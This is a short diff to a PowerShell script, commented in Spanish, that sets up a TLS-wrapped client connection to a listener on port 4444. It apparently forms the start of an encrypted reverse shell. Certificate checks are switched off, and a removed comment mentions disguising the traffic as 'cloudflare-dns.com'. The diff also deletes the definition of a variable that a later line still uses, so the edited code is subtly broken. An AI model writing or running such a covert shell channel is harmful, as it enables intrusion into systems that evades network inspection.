@@ -1,9 +1,9 @@
-$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
+# 1. Abres el canal físico usando la IP local
 $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 4444);
 $NetworkStream = $TCPClient.GetStream();
 $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
 
-# IMPORTANTE: Cambiar 'cloudflare-dns.com' por 'localhost' si tu servidor Python usa el certificado autofirmado local
+# 2. Autenticas usando el nombre exacto que tiene el certificado generado por Python
 $SslStream.AuthenticateAsClient('localhost', $null, $sslProtocols, $false);
 
 if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
